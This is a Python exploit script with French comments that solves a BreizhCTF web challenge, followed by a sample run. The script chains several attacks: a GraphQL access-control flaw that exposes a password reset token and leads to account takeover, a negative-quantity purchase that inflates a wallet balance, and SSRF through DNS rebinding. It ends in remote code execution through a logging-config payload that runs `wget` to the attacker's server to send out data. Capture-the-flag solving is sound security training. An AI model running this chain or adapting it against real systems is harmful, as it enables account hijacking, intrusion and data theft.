#!/usr/bin/env python3
"""
solve.py — Escape from "Prison de la Santé" (BreizhCTF)
Exploit complet en une seule commande.

Chaine d'exploitation :
  [ETAPE 1] GraphQL BOLA → ATO du compte gardien b.bellick
    1. Query publique announcements → e-mail de Bellick
    2. POST /api/auth/forgot-password → génère le reset token en base
    3. Query publique announcements → lecture du token (champ non protégé)
    4. POST /api/auth/reset-password → nouveau mot de passe connu
    5. POST /api/auth/login → JWT gardien

  [ETAPE 2] Business Logic + Marché Noir → code d'activation FLUX
    1. Connexion en tant que m.scofield (FoxRiver1!)
    2. Achat avec quantité négative → solde gonflé
    3. Achat du "Tuyau" sur le marché noir → code FLUX-<hex>

  [ETAPE 3] SSRF via DNS Rebinding + RCE Flask → flag
    1. Démarrage serveur HTTP local (sert evil.json, capture callback /flag)
    2. Enregistrement d'une source externe piégée (URL avec rebind 1u.ms)
    3. Déclenchement fetchExternalFeed (code FLUX requis)
       → dns.resolve4("make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms") = 1.2.3.4  (filtre OK)
       → fetch(...)                                                 = 127.0.0.1 (atteint Flask :5000)
       → Flask GET /parametres/api/config/reload?url=http://<attacker>/evil.json
       → dictConfig() instancie subprocess.Popen → /getflag | exfiltration base64

Usage :
  python3 solve.py --target http://challenge.ctf:PORT --attacker <IP_PUBLIQUE>

  Options :
    --port      Port HTTP local pour evil.json + callback (defaut: 1337)
    --attempts  Nombre max de tentatives de rebinding (defaut: 30)
"""

import argparse
import base64
import http.server
import json
import re
import secrets
import sys
import threading
import time
import urllib.parse

import requests

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

GUARD_USERNAME   = "b.bellick"
GUARD_PASSWORD   = "CTFsolve_2026!"   # defini a l'etape 1

INMATE_USERNAME  = "m.scofield"
INMATE_PASSWORD  = "FoxRiver1!"

TUYAU_MIN_BALANCE = 1850.0   # prix tuyau + marge

FLAG = None

# ---------------------------------------------------------------------------
# Helpers communs
# ---------------------------------------------------------------------------

def gql(session, target, query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    body = {"query": query}
    if variables:
        body["variables"] = variables
    resp = session.post(f"{target}/graphql", json=body, headers=headers, timeout=15)
    resp.raise_for_status()
    data = resp.json()
    if "errors" in data:
        raise RuntimeError(f"GraphQL error: {data['errors']}")
    return data["data"]


def login(session, target, username, password):
    resp = session.post(
        f"{target}/api/auth/login",
        json={"username": username, "password": password},
        timeout=10,
    )
    resp.raise_for_status()
    j = resp.json()
    if "token" not in j:
        raise RuntimeError(f"Login echoue pour {username} : {j}")
    return j["token"]


# ---------------------------------------------------------------------------
# Etape 1 — ATO gardien via BOLA
# ---------------------------------------------------------------------------

def ato_get_guard_email(session, target):
    print("  [1/5] BOLA — e-mail du gardien via announcements")
    data = gql(session, target, "{ announcements { author { username email } } }")
    for ann in data["announcements"]:
        author = ann["author"]
        if author.get("email", "").endswith("@administration.penitentiaire-sante.fr"):
            print(f"         Trouve : {author['username']} <{author['email']}>")
            return author["username"], author["email"]
    raise RuntimeError("Aucun e-mail de gardien trouve dans les annonces")


def ato_trigger_forgot_password(session, target, email):
    print(f"  [2/5] Forgot-password → generation du token pour {email}")
    resp = session.post(
        f"{target}/api/auth/forgot-password",
        json={"email": email},
        timeout=10,
    )
    resp.raise_for_status()


def ato_get_reset_token(session, target, username):
    print("  [3/5] BOLA — lecture du reset token via announcements")
    data = gql(session, target, "{ announcements { author { username token } } }")
    for ann in data["announcements"]:
        author = ann["author"]
        if author.get("username") == username and author.get("token"):
            print(f"         Token : {author['token']}")
            return author["token"]
    raise RuntimeError("Token introuvable — forgot-password a-t-il ete appele ?")


def ato_reset_password(session, target, token):
    print(f"  [4/5] Reset du mot de passe → {GUARD_PASSWORD}")
    resp = session.post(
        f"{target}/api/auth/reset-password",
        json={"token": token, "newPassword": GUARD_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    j = resp.json()
    if not j.get("success"):
        raise RuntimeError(f"Reset echoue : {j}")


def step1_ato_guard(session, target):
    print("\n[ETAPE 1] ATO du compte gardien via GraphQL BOLA")
    username, email = ato_get_guard_email(session, target)
    ato_trigger_forgot_password(session, target, email)
    token = ato_get_reset_token(session, target, username)
    ato_reset_password(session, target, token)
    print(f"  [5/5] Connexion en tant que {username}")
    jwt = login(session, target, username, GUARD_PASSWORD)
    print(f"         JWT gardien : {jwt[:48]}...")
    print(f"  [+] Compte {username} compromis")
    return jwt


# ---------------------------------------------------------------------------
# Etape 2 — Business Logic + Marche Noir
# ---------------------------------------------------------------------------

def get_wallet_balance(session, target, jwt):
    data = gql(session, target, "{ myProfile { walletBalance } }", token=jwt)
    return float(data["myProfile"]["walletBalance"])


def inflate_wallet(session, target, jwt):
    balance = get_wallet_balance(session, target, jwt)
    if balance >= TUYAU_MIN_BALANCE:
        print(f"         Solde suffisant : {balance:.2f}€")
        return

    print(f"  [2/3] Business Logic — gonflement du solde (actuel : {balance:.2f}€)")
    data = gql(session, target, "{ storeItems { id name price stock available } }", token=jwt)
    items = [i for i in data["storeItems"] if i["available"] and int(i["stock"]) > 0]
    if not items:
        raise RuntimeError("Aucun article disponible en boutique")
    item = max(items, key=lambda i: float(i["price"]))
    print(f"         Article choisi : {item['name']} @ {item['price']}€")

    price = float(item["price"])
    needed = TUYAU_MIN_BALANCE - balance
    qty = -int(needed / price) - 10

    data = gql(
        session, target,
        "mutation B($items: [PurchaseItemInput!]!) { purchaseItems(items: $items) { total } }",
        variables={"items": [{"itemId": item["id"], "quantity": qty}]},
        token=jwt,
    )
    new_balance = get_wallet_balance(session, target, jwt)
    print(f"         Nouveau solde : {new_balance:.2f}€")


def buy_tuyau(session, target, jwt):
    print("  [3/3] Marche noir — achat du tuyau")
    data = gql(
        session, target,
        """
          {
            blackMarketListings {
              id price quantity active
              contrabandItem { name }
              seller { username }
            }
          }
        """,
        token=jwt,
    )
    listing = next(
        (l for l in data["blackMarketListings"]
         if "tuyau" in l["contrabandItem"]["name"].lower() or "service" in l["contrabandItem"]["name"].lower()),
        None,
    )
    if not listing:
        raise RuntimeError("Annonce du tuyau introuvable sur le marche noir")
    print(f"         Annonce : {listing['contrabandItem']['name']} @ {listing['price']}€ (id={listing['id']})")

    data = gql(
        session, target,
        "mutation B($id: ID!) { buyFromBlackMarket(listingId: $id) { detected message } }",
        variables={"id": listing["id"]},
        token=jwt,
    )
    result = data["buyFromBlackMarket"]
    if result["detected"]:
        raise RuntimeError(
            "Transaction detectee (~10% de risque). L'annonce passe a quantity=0 / active=FALSE "
            "et ne peut plus etre achetee. Relancer le challenge pour reinitialiser le seed."
        )
    msg = result["message"]
    match = re.search(r"(FLUX-[0-9a-f]+)", msg, re.IGNORECASE)
    if not match:
        raise RuntimeError(f"Code introuvable dans : {msg}")
    code = match.group(1)
    print(f"         Transaction reussie — code : {code}")
    return code


def step2_get_flux_code(session, target):
    print("\n[ETAPE 2] Business Logic + Marche Noir → code d'activation FLUX")
    print(f"  [1/3] Connexion en tant que {INMATE_USERNAME}")
    jwt = login(session, target, INMATE_USERNAME, INMATE_PASSWORD)
    print(f"         JWT : {jwt[:48]}...")

    inflate_wallet(session, target, jwt)
    code = buy_tuyau(session, target, jwt)
    print(f"  [+] Code FLUX obtenu : {code}")
    return code


# ---------------------------------------------------------------------------
# Etape 3 — SSRF + DNS Rebinding + RCE Flask
# ---------------------------------------------------------------------------

def build_evil_json(attacker_ip, attacker_port):
    cmd = f"wget -qO- \"http://{attacker_ip}:{attacker_port}/flag?f=$(/getflag | base64 -w0)\""
    return {
        "version": 1,
        "disable_existing_loggers": False,
        "handlers": {
            "exfil": {
                "()": "subprocess.Popen",
                "args": ["sh", "-c", cmd],
            }
        },
        "root": {
            "level": "DEBUG",
            "handlers": ["exfil"],
        },
    }


class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        global FLAG
        parsed = urllib.parse.urlparse(self.path)

        if parsed.path == "/evil.json":
            payload = build_evil_json(self.server.attacker_ip, self.server.attacker_port)
            body = json.dumps(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print("         [HTTP] evil.json servi")

        elif parsed.path == "/flag":
            params = urllib.parse.parse_qs(parsed.query)
            encoded = params.get("f", [""])[0]
            try:
                FLAG = base64.b64decode(encoded + "==").decode().strip()
            except Exception:
                FLAG = encoded
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")
            print(f"\n  [+] FLAG recu : {FLAG}")

        else:
            self.send_response(404)
            self.end_headers()


def start_http_server(attacker_ip, port):
    server = http.server.HTTPServer(("0.0.0.0", port), CallbackHandler)
    server.attacker_ip = attacker_ip
    server.attacker_port = port
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    print(f"         Serveur HTTP en ecoute sur :{port}")
    return server


def _build_feed_url(attacker_ip, attacker_port, prefix):
    # <prefix>.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms :
    #   prefixe aleatoire → contourne le cache DNS du resolveur recursif cote backend
    #   1ere resolution DNS → 1.2.3.4    (filtre passe)
    #   2eme resolution DNS → 127.0.0.1  (atteint Flask :5000 apres rebind)
    rebind_host = f"{prefix}.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms"
    evil_url    = f"http://{attacker_ip}:{attacker_port}/evil.json"
    ssrf_path   = f"/parametres/api/config/reload?url={urllib.parse.quote(evil_url, safe='')}"
    feed_url    = f"http://{rebind_host}:5000{ssrf_path}"
    return rebind_host, feed_url


def ssrf_register_feed(session, target, guard_jwt, feed_url, name):
    data = gql(
        session, target,
        "mutation A($name: String!, $url: String!, $type: String) { addExternalFeed(name: $name, url: $url, type: $type) { id } }",
        variables={"name": name, "url": feed_url, "type": "json"},
        token=guard_jwt,
    )
    return data["addExternalFeed"]["id"]


def ssrf_trigger(session, target, guard_jwt, code, attacker_ip, attacker_port, max_attempts):
    print(f"  [2/3] Declenchement SSRF + rebinding (jusqu'a {max_attempts} tentatives)")
    print(f"         Prefixe aleatoire par tentative pour contourner le cache DNS")
    for attempt in range(1, max_attempts + 1):
        prefix = secrets.token_hex(4)
        rebind_host, feed_url = _build_feed_url(attacker_ip, attacker_port, prefix)
        print(f"         Tentative {attempt}/{max_attempts} ({rebind_host})...", end=" ", flush=True)
        try:
            feed_id = ssrf_register_feed(session, target, guard_jwt, feed_url, f"DAP-{prefix}")
            data = gql(
                session, target,
                "mutation F($feedId: ID!, $code: String!) { fetchExternalFeed(feedId: $feedId, activationCode: $code) { success statusCode error } }",
                variables={"feedId": feed_id, "code": code},
                token=guard_jwt,
            )
            r = data["fetchExternalFeed"]
            print(f"success={r['success']} http={r.get('statusCode')} err={r.get('error')}")
        except Exception as e:
            print(f"erreur : {e}")

        # callback peut arriver apres le retour de fetchExternalFeed
        for _ in range(20):
            if FLAG:
                return True
            time.sleep(0.25)
    return False


def step3_ssrf_rce(session, target, guard_jwt, flux_code, attacker_ip, attacker_port, max_attempts):
    print("\n[ETAPE 3] SSRF via DNS Rebinding + RCE Flask")
    start_http_server(attacker_ip, attacker_port)

    print("  [1/3] Strategie : nouveau feed avec prefixe aleatoire par tentative")
    success = ssrf_trigger(session, target, guard_jwt, flux_code, attacker_ip, attacker_port, max_attempts)

    if not success:
        print(f"  [3/3] Attente du callback flag (15s)...")
        deadline = time.time() + 15
        while time.time() < deadline and not FLAG:
            time.sleep(0.5)

    return FLAG


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description='Escape from "Prison de la Sante" — exploit complet',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--target",   required=True, help="URL du challenge, ex. http://10.0.0.1:3000")
    parser.add_argument("--attacker", required=True, help="IP publique accessible depuis le serveur cible")
    parser.add_argument("--port",     type=int, default=1337, help="Port HTTP local (defaut: 1337)")
    parser.add_argument("--attempts", type=int, default=30,  help="Tentatives de rebinding (defaut: 30)")
    return parser.parse_args()


def main():
    args = parse_args()
    target       = args.target.rstrip("/")
    attacker_ip  = args.attacker
    attacker_port = args.port

    print(f"[*] Cible     : {target}")
    print(f"[*] Attaquant : {attacker_ip}:{attacker_port}")

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (CTF Solver)"})

    guard_jwt  = step1_ato_guard(session, target)
    flux_code  = step2_get_flux_code(session, target)
    flag       = step3_ssrf_rce(session, target, guard_jwt, flux_code, attacker_ip, attacker_port, args.attempts)

    if flag:
        print(f"\n{'='*60}")
        print(f"  FLAG : {flag}")
        print(f"{'='*60}\n")
    else:
        print("\n[-] Flag non recu. Verifier :")
        print("    - IP attaquant accessible depuis le serveur")
        print("    - Port ouvert (firewall ?)")
        print("    - Relancer : le rebinding DNS est probabiliste")
        sys.exit(1)


if __name__ == "__main__":
    main()

"""
❯ python3 solve.py --target http://escape-from-prison-de-la-sante-0.chall.ctf.bzh --attacker 172.18.0.1 --port 1337
[*] Cible     : http://escape-from-prison-de-la-sante-0.chall.ctf.bzh
[*] Attaquant : 172.18.0.1:1337

[ETAPE 1] ATO du compte gardien via GraphQL BOLA
  [1/5] BOLA — e-mail du gardien via announcements
         Trouve : b.bellick <b.bellick@administration.penitentiaire-sante.fr>
  [2/5] Forgot-password → generation du token pour b.bellick@administration.penitentiaire-sante.fr
  [3/5] BOLA — lecture du reset token via announcements
         Token : 728a048d343f3a085fe07f8c8daedd214e5da8f3
  [4/5] Reset du mot de passe → CTFsolve_2026!
  [5/5] Connexion en tant que b.bellick
         JWT gardien : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OSw...
  [+] Compte b.bellick compromis

[ETAPE 2] Business Logic + Marche Noir → code d'activation FLUX
  [1/3] Connexion en tant que m.scofield
         JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSw...
  [2/3] Business Logic — gonflement du solde (actuel : 12.00€)
         Article choisi : Radio portable @ 25€
         Nouveau solde : 2087.00€
  [3/3] Marche noir — achat du tuyau
         Annonce : Tuyau — Accès service réglementaire @ 1800€ (id=6)
         Transaction reussie — code : FLUX-340423664d8e6423821551c95094758b
  [+] Code FLUX obtenu : FLUX-340423664d8e6423821551c95094758b

[ETAPE 3] SSRF via DNS Rebinding + RCE Flask
         Serveur HTTP en ecoute sur :1337
  [1/3] Strategie : nouveau feed avec prefixe aleatoire par tentative
  [2/3] Declenchement SSRF + rebinding (jusqu'a 30 tentatives)
         Prefixe aleatoire par tentative pour contourner le cache DNS
         Tentative 1/30 (c521c78f.make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms)...          [HTTP] evil.json servi

  [+] FLAG recu : BZHCTF{FakeFlag}
success=True http=200 err=None

============================================================
  FLAG : BZHCTF{FakeFlag}
============================================================
"""
